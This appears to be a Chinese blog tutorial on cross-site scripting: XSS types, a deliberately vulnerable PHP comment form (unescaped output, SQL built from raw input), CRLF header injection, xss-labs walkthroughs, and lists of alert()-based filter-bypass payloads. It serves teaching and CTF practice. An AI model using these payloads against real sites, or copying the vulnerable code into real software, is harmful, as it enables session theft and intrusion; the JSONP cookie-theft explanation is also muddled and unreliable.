@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html data-theme="light">
+
+<head>
+  <title>Szkc</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="
+      width=device-width, 
+      initial-scale=1.0, 
+      minimum-scale=1.0, 
+      maximum-scale=1.0,
+      user-scalable=no
+    " />
+  <link rel="icon" href="">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+
+  
+<script src="/js/lib/jquery-3.6.3.min.js" defer></script>
+
+  
+  
+<script src="/js/lib/highlight.min.js" defer></script>
+
+  
+<script src="/js/main.js" type="module" defer></script>
+
+  
+<script src="/js/theme.js" type="module" defer></script>
+
+  
+<script src="/js/page/header.js" type="module" defer></script>
+
+  
+<script src="/js/page/side-menu.js" type="module" defer></script>
+
+  
+<script src="/js/page/search/index.js" defer></script>
+
+
+  
+  
+  
+
+  
+  
+<script src="/js/lib/busuanzi.pure.min.js" defer></script>
+
+  
+
+  
+  
+<script src="/js/page/search/local-search.js" type="module" defer></script>
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body style="position: relative;">
+  
+<div id="loading-box">
+  <div class="wave">
+    <div class="wave-child wave1"></div>
+    <div class="wave-child wave2"></div>
+    <div class="wave-child wave3"></div>
+    <div class="wave-child wave4"></div>
+    <div class="wave-child wave5"></div>
+  </div>
+</div>
+
+<script>
+  window.addEventListener("load", function() {
+    document.body.style.overflow = "auto";
+    document.getElementById("loading-box").classList.add("loaded")
+  }, false)
+</script>
+
+  <div class="bg-wrapper">
+  <canvas id="bg-canvas" />
+</div>
+  <div class="side-menu-container animate__animated animate__faster">
+  <ul class="menu animate__animated animate__faster">
+    <li class="menu-item"}><a href="/" title="首页">首页</a></li><li class="menu-item"}><a href="/projects" title="项目">项目</a></li><li class="menu-item"}><a href="/message" title="留言">留言</a></li><li class="menu-item"}><a href="/links" title="链接">链接</a></li><li class="menu-item"}><a href="/about" title="关于">关于</a></li>
+    <li class="category-menu-wrapper">
+      <div class="menu-item-name">
+        <span>分类</span>
+        <span class="iconfont icon-chevron-bottom"></span>
+      </div>
+      
+    </li>
+    <li class="iconfont icon-close-circle"></li>
+  </ul>
+</div>
+  
+<div class="search-pop-overlay">
+  <div class="popup search-popup">
+    
+    <div class="search-header">
+  <h2 class="search-title">
+    本地搜索
+    <i class="popup-btn-close iconfont icon-close"></i>
+  </h2>
+  <div class="search-input-container">
+    <input class="search-input" autocomplete="off" autocapitalize="off" maxlength="80" placeholder="请输入关键字" spellcheck="false" type="search">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result flex flex-column">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>    
+  </div>
+</div>
+
+  <header class="main-header animate__animated animate__fadeInDown">
+  <a class="blogger-info flex flex-align-center" href="/">
+    <img src="" alt="avatar">
+    <span>Szkc </span>
+  </a>
+  <nav>
+    <ul class="menu flex flex-align-center">
+      <li class="menu-item"}><a href="/" title="首页">首页</a></li><li class="menu-item"}><a href="/projects" title="项目">项目</a></li><li class="menu-item"}><a href="/message" title="留言">留言</a></li><li class="menu-item"}><a href="/links" title="链接">链接</a></li><li class="menu-item"}><a href="/about" title="关于">关于</a></li>
+      <li class="menu-category">
+        <div class="flex flex-align-center">
+          <span>分类</span>
+          <span class="iconfont icon-chevron-bottom"></span>
+        </div>
+        
+      </li>
+    </ul>
+  </nav>
+  <div class="right-icon flex flex-align-center">
+    <span class="search-popup-trigger iconfont icon-search"></span>
+    <span class="iconfont icon-view-list"></span>
+  </div>
+</header>
+<div class="header-slot"></div>
+  <main class="page-container">
+    <div class="page-post-container animate__animated animate__fadeIn">
+  <section class="post-wrapper">
+    <header class="post-header">
+      
+      
+      <span class="post-title">XSS</span>
+      
+      <div class="post-publish-info-wrapper flex">
+        <img class="author-avatar" src="" alt="">
+        <div class="post-info flex flex-column flex-space-around">
+          <div>
+            szkangcheng
+            <span>· 11/08, 2024 · </span>
+            <span id="/2024/11/08/xss%E5%B0%8F%E5%AF%84%E5%B7%A7/" class="leancloud_visitors" data-flag-title="XSS">
+              阅读
+              
+              <span id="busuanzi_value_page_pv"></span>
+              
+            </span>
+          </div>
+          
+        </div>
+        </span>
+      </div>
+    </header>
+    <article class="post-content markdown">
+      <!-- <a name="index" style=" position: relative;top: -120px;display: block;height: 0;overflow: hidden;"></a> -->
+      <h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>​	跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见的Web安全漏洞，攻击者通过在受害者的浏览器中注入恶意脚本来执行恶意行为。这种攻击通常利用Web应用程序没有对用户输入的数据进行足够的过滤和验证。</p>
+<h1 id="2-攻击原理"><a href="#2-攻击原理" class="headerlink" title="2.攻击原理"></a><strong>2.攻击原理</strong></h1><p>​	</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XSS跨站脚本攻击的原理是利用Web应用程序对用户输入数据的不足过滤和验证，将恶意脚本注入到受害者的浏览器中，使其在浏览器中执行。</span><br><span class="line">攻击者通常会将恶意脚本嵌入到Web页面中的某个位置，比如输入框、评论框、搜索框等等，然后诱使用户访问这个被注入了恶意脚本的页面。当用户访问页面时，恶意脚本就会在用户的浏览器中被执行，从而执行攻击者预先设定好的恶意行为，比如窃取用户的Cookie信息、伪造用户的网站行为等等。</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-XXS的分类"><a href="#3-XXS的分类" class="headerlink" title="3.XXS的分类"></a><strong>3.XXS的分类</strong></h1><h2 id="1-存储型XXS"><a href="#1-存储型XXS" class="headerlink" title="1.存储型XXS"></a>1.存储型XXS</h2><ol>
+<li><p>定义：简单来说，存储型XXS是将攻击代码存储在服务器或者数据库。当数据库或者服务器被访问时，恶意代码便会开始工作，（例如盗取客户的cookie等），造成蠕虫问题，也就是把恶意代码制作成脚本在服务器或者客户端进行攻击。</p>
+</li>
+<li><p>XXS的流通：一般而言，在前端将代码上传到后端并插入数据库或者服务器，当管理员或者用户访问服务器的时候，恶意代码又从后端返回到前端。</p>
+</li>
+<li><p>XXS的的攻击思路：利用GET、POST或者抓包在Referer，Cookie的地方植入我们的恶意脚本</p>
+</li>
+<li><p>源码实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;存储型XSS示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h1&gt;欢迎使用我们的网站！&lt;/h1&gt;</span><br><span class="line">  &lt;form&gt;</span><br><span class="line">    &lt;p&gt;请输入您的评论：&lt;/p&gt;</span><br><span class="line">    &lt;textarea name=&quot;comment&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">  &lt;?php</span><br><span class="line">    // 处理评论表单的提交</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">      $comment = $_POST[&#x27;comment&#x27;];</span><br><span class="line">      // 将评论存储到数据库中</span><br><span class="line">      $sql = &quot;INSERT INTO comments (content) VALUES (&#x27;$comment&#x27;)&quot;;</span><br><span class="line">      mysqli_query($conn, $sql);</span><br><span class="line">    &#125;</span><br><span class="line">  ?&gt;</span><br><span class="line">  &lt;h2&gt;评论区&lt;/h2&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">      // 显示所有评论</span><br><span class="line">      $result = mysqli_query($conn, &quot;SELECT * FROM comments&quot;);</span><br><span class="line">      while ($row = mysqli_fetch_assoc($result)) &#123;</span><br><span class="line">        echo &quot;&lt;li&gt;&quot; . $row[&#x27;content&#x27;] . &quot;&lt;/li&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接从<code>$_POST[&#39;comment&#39;]</code>获取用户提交的评论，并将其插入到数据库中，而没有进行任何形式的验证或转义。</p>
+<p>如果在评论框中输入了类似<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>的内容，这段脚本将被直接存储到数据库中，并在之后被显示在页面上，导致浏览器执行这段脚本。</p>
+<p>​    <em>$comment &#x3D; $_POST[‘comment’];<br>​    $sql &#x3D; “INSERT INTO comments (content) VALUES (‘$comment’)”;<br>​    mysqli_query($conn, $sql);</em></p>
+<p>同样，从数据库中检索评论并显示在页面上时，同样没有对这些内容进行转义。</p>
+<p>​    <em>echo “<li>“ . $row[‘content’] . “</li>“;</em></p>
+</li>
+</ol>
+<h2 id="2-反射型XXS"><a href="#2-反射型XXS" class="headerlink" title="2.反射型XXS"></a>2.反射型XXS</h2><p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
+<p>一般就是题目给一个<input>标签形成的输入框，然后我们在输入框里输入我们的恶意脚本，需要用户进行触发才能进行攻击，在前端输入恶意脚本，后端接受，然后再在前端显示，这也就是反射型XSS的数据流通。</p>
+<p>这种XSS攻击方式是最简单的一种XSS攻击方式，它需要用户手动触发才能执行。</p>
+<p>在CTF中，反射型XSS算是比较常见的一种XSS攻击方式了，题目会给一个输入框，然后绕过过滤，执行恶意脚本</p>
+<h2 id="3-DOM"><a href="#3-DOM" class="headerlink" title="3.DOM"></a>3.DOM</h2><p>反射型xss的一种，但是只在前端执行（直接嵌入到HTML代码中）。DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制脚本的执行的。</p>
+<p>payload：</p>
+<p><a href=javascript:alert(1)>aaa</a></p>
+<h2 id="4-JSONP-攻击模式"><a href="#4-JSONP-攻击模式" class="headerlink" title="4.JSONP 攻击模式"></a>4.JSONP 攻击模式</h2><p>这个其实也是反射型XSS的一种攻击方式。</p>
+<p>这是一种比较罕见的一种XSS的攻击方式，它利用JSONP协议实现，一般浏览器都会设置CSP同源策略限制，不允许直接调用其他域名的API，这就出现了JSONP协议，JSONP协议通过利用浏览器对<code>&lt;script&gt;</code>标签的允许跨域加载特性，允许从一个域名中获取到另一个域名的数据。所以说我们作为攻击者可以在JSONP请求中注入恶意代码实现XSS攻击。</p>
+<p>如果我们有一个API端口为”<a target="_blank" rel="noopener" href="http://evi1s7.com/api">http://Evi1s7.com/api&quot;,它返回一个JSONP响应，其中包含一个名为<code>callback</code>的函数，该函数将数据作为参数传递。</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123; &quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30 &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以构造一个恶意URL，以便在受害者浏览器中执行恶意脚本：（跨域加载了恶意script）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://Evi1s7.com/api?callback=attackerFunction</span><br></pre></td></tr></table></figure>
+
+<p>这会导致我们之前的API端口返回的JSON发生了修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacjerFunction(&#123; &quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30 &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以在页面中定义<code>attackerFunction</code>，然后注入恶意脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function attackerFunction(data) &#123;</span><br><span class="line">  // 恶意代码</span><br><span class="line">  document.cookie = &quot;sessionID=&quot; + data.name;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用上述恶意脚本，我们可以获得John的sessionID值，窃取Cookie从而实现无密码登录，实现XSS攻击</p>
+<h1 id="4-XSS的攻击对象"><a href="#4-XSS的攻击对象" class="headerlink" title="4.XSS的攻击对象"></a>4.XSS的攻击对象</h1><p><del>插哪里都可以</del></p>
+<h2 id="1-HTML注释"><a href="#1-HTML注释" class="headerlink" title="1.HTML注释"></a>1.HTML注释</h2><p>加载HTML注释同时运行脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Evi1s7 --&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">&lt;script&gt;</span><br><span class="line">  alert(&#x27;XSS攻击成功！&#x27;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-HTML标签"><a href="#2-HTML标签" class="headerlink" title="2.HTML标签"></a>2.HTML标签</h2><h3 id="1-HTML标签名："><a href="#1-HTML标签名：" class="headerlink" title="1.HTML标签名："></a>1.HTML标签名：</h3><p>例如，我们将恶意代码插入到<code>&lt;img&gt;</code>标签中，由于标签名被拆分成两部分，浏览器会将第一个尖括号视为标签名的起始符号，而第二个尖括号则是<code>&lt;script&gt;</code> 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现我们的XSS攻击</p>
+<h3 id="2-HTML属性名："><a href="#2-HTML属性名：" class="headerlink" title="2.HTML属性名："></a>2.HTML属性名：</h3><p>源码示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onclick=&quot;alert(&#x27;Evi1s7&#x27;)&quot; name=&quot;“&gt;&lt;script&gt;alert(&#x27;XSS攻击成功！&#x27;)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这一段示例的代码，将恶意代码插入到了<code>&lt;input&gt;</code>标签中的name属性值中,我们可以利用闭合的方式将恶意代码插入到<code>&lt;input&gt;</code>标签中，实现XSS攻击</p>
+<h3 id="3-HTML属性值"><a href="#3-HTML属性值" class="headerlink" title="**3.HTML属性值"></a>**3.HTML属性值</h3><p>例如，我们将<code>&lt;script&gt;</code>恶意代码插入到了<code>&lt;img&gt;</code>标签的oneerror属性中，从而欺骗浏览器执行恶意代码</p>
+<p>当image图片无法显示时，会调用onerror属性，从而执行恶意脚本</p>
+<p><strong>注意：onerror属性直接执行js语句！</strong></p>
+<p>onerror&#x3D;”alert(114)”</p>
+<p>不需要执行<script></p>
+<p>否则语法错误</p>
+<p>例如，<a href=javascript:alert(1)>aaa</a>（点击链接，触发js事件）将js事件用伪协议写在href属性中，避免一些绕过。</p>
+<p>比如有些网站会过滤<img>中的onerror属性。</p>
+<h2 id="tip：js伪协议"><a href="#tip：js伪协议" class="headerlink" title="tip：js伪协议"></a>tip：js伪协议</h2><ol>
+<li><code>javascript:</code> 伪协议</li>
+</ol>
+<p><code>javascript:</code> 伪协议被用来在浏览器地址栏、链接或按钮中执行 JavaScript 代码。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;Hello, world!&#x27;);&quot;&gt;Click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>在href等属性中是不能够执行<script>的所以需要js伪协议</strong></p>
+<p>在这个例子中，当用户点击链接时，浏览器将执行 <code>alert(&#39;Hello, world!&#39;)</code> 代码，弹出一个对话框。</p>
+<ol start="2">
+<li><code>data:</code> 伪协议</li>
+</ol>
+<p><code>data:</code> 协议用于嵌入小的文件或数据，常见于将图像或文件嵌入网页。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">&lt;img src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA...&quot; alt=&quot;Embedded Image&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>data:</code> 协议允许你直接在网页中嵌入图像或其他文件内容，而不需要额外的网络请求。</p>
+<ol start="3">
+<li><code>file:</code> 伪协议</li>
+</ol>
+<p><code>file:</code> 伪协议用于访问本地文件系统上的文件。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">&lt;a href=&quot;file:///C:/Users/Username/Documents/file.txt&quot;&gt;Open File&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这种协议通常用于在本地环境中访问文件。由于安全原因，许多浏览器限制了 <code>file:</code> 协议的使用，特别是在网页的上下文中。</p>
+<ol start="4">
+<li><code>mailto:</code> 伪协议</li>
+</ol>
+<p><code>mailto:</code> 协议用于启动邮件客户端并生成一个新的电子邮件。比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">&lt;a href=&quot;mailto:test@example.com&quot;&gt;Send Email&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当用户点击这个链接时，浏览器会启动系统的默认邮件客户端，并自动填充收件人字段为 <code>test@example.com</code>。</p>
+<p>当用户运行到此代码时，便会运行XSS</p>
+<p>需要灵活根据网站的过滤情况进行判断</p>
+<h3 id="常见注入"><a href="#常见注入" class="headerlink" title="常见注入"></a>常见注入</h3><p>这里以alert(1)为例子：</p>
+<p><a href="javascript:alert(1)">aaa</a></p>
+<p>//<svg onload="javascript:alert(1)">onload表示只要完成加载就会触发的js函数</p>
+<h3 id="5-插入到HTTP响应中"><a href="#5-插入到HTTP响应中" class="headerlink" title="**5.插入到HTTP响应中"></a>**5.插入到HTTP响应中</h3><p><a target="_blank" rel="noopener" href="http://localhost/xss-labs/level11.php?keyword=good%20job">http://localhost/xss-labs/level11.php?keyword=good%20job</a>!</p>
+<p>请注意：本题需要从第10题进入否则无法得到注入点！</p>
+<p>例如本题，本题中，xss注入点为t_ref传参，根据观察不难看出该参数的值=referer头（经过部分过滤）</p>
+<p>所以可以在请求包中更改referer头，填写payload。</p>
+<p>（当然，referer头需要在跳转页面拦截（笑）---&gt;服务器可能不会理会页面刷新时的referer头更新情况）</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/xss-labs/level12.php?keyword=good%20job">http://localhost/xss-labs/level12.php?keyword=good%20job</a>!</p>
+<p>本题则是在User-Agent头搞事。</p>
+<p>这里可能牵扯到CRLF漏洞，简单介绍：</p>
+<h4 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h4><p>CRLF是“回车+换行”（\r\n）的简称，在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的。它们通常被一起使用来表示一行的结束。浏览器根据这两个CRLF来取出HTTP内容并显示出来。</p>
+<p><strong>提及：回车（%0d）指光标到行首，而换行（%0a）指光标到下一行。一般而言，回车加换行指新开启一行。当然在windows中，单点换行就已经具有回车+换行的作用了</strong></p>
+<p>该漏洞指的是用户的浏览器不能正确地过滤掉响应包中的内容，导致攻击者可以控制用户输入中的HTML信息进行攻击。例如在响应包中插入XSS使用户信息收到损失。</p>
+<p>为了修复该漏洞：</p>
+<ul>
+<li>过滤用户输入中的\r和\n等换行符，避免它们被注入到HTTP头中。</li>
+<li>对HTTP响应头进行严格的验证和编码，确保它们不会被恶意内容所污染。</li>
+<li>升级和更新Web应用程序和服务器软件，以获取最新的安全补丁和修复程序。</li>
+</ul>
+<p>比如有一个搜索关键词的网站利用GET的形式传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp:?key=aaa</span><br></pre></td></tr></table></figure>
+
+<p>如果该网站存在CRLF漏洞，那么我们就可以利用回车符/换行符进行绕过过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>在这里，两次的回车换行使key所在请求头行的img所在行之间形成了空行，使img行被解析为body被直接响应。</strong></p>
+<p><strong>当然，如果浏览器存在CRLF过滤规则的话那个%0d%0a会被直接解析为\r\n的文本数据，不会回车换行。</strong></p>
+<p>我们抓一下包看一下返回包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Content-type:text/html</span><br><span class="line"></span><br><span class="line">Contet-Length:xxx</span><br><span class="line"></span><br><span class="line">Connection:close</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以发现我们利用CRLF漏洞将http包分为了header和body，利用回车符/换行符成功执行了body中的代码，实现XSS</strong></p>
+<p><strong>如果遇到XSS过滤的情况我们还可以在httpheader中注入X-XSS-Protection:0（停止使用浏览器的XSS过滤功能），可绕过浏览器的过滤规则实现XSS弹窗显示。</strong></p>
+<h1 id="5-XSS的绕过"><a href="#5-XSS的绕过" class="headerlink" title="5.XSS的绕过"></a>5.XSS的绕过</h1><h2 id="1-关键词绕过"><a href="#1-关键词绕过" class="headerlink" title="1.关键词绕过"></a>1.关键词绕过</h2><h3 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h3><p>靶场06</p>
+<p><a target="_blank" rel="noopener" href="https://xss.tesla-space.com/level6.php?keyword=break%20it%20out">https://xss.tesla-space.com/level6.php?keyword=break%20it%20out</a>!</p>
+<p>不难发现，在“value”的的值中形如script,on,href.src这些都被绕过了。</p>
+<p>那么，又不难发现，该过滤没有对大小写进行检测，那么只要将on替换为On即可。</p>
+<p>payload实例：&quot; Onmouseover=javascript:alert(1) &quot;</p>
+<h3 id="2-拼接绕过"><a href="#2-拼接绕过" class="headerlink" title="2.拼接绕过"></a>2.拼接绕过</h3><p>（alert函数用于弹出警告框，该函数在许多浏览器中都会被过滤掉，所以这里采用拼接的方式执行alert函数，for example）</p>
+<p><strong>0x01. eval</strong>：用于执行字符串表达式，通常执行字符串内的代码，但是在这里，eval期望执行字符串而不是函数，所以可以删掉eval</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x02. top</strong>：用于访问最顶层的窗口（例如有多层网页用ifram嵌套的时候），在顶层窗口弹出警告</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x03. window</strong>：用于访问当前浏览器窗口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x04. self</strong>：和windows效果差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x05. parent</strong>：和top效果差不多，但是parent仅指父窗口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x06. frames</strong>：和parent效果差不多，但frames是页面内的所有框架，也就是子窗口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-函数替换"><a href="#3-函数替换" class="headerlink" title="3.函数替换"></a>3.函数替换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上述只是用img标签进行展示，当然别的地方也可以这么用。</p>
+<h3 id="4-嵌套绕过"><a href="#4-嵌套绕过" class="headerlink" title="4.嵌套绕过"></a>4.嵌套绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+
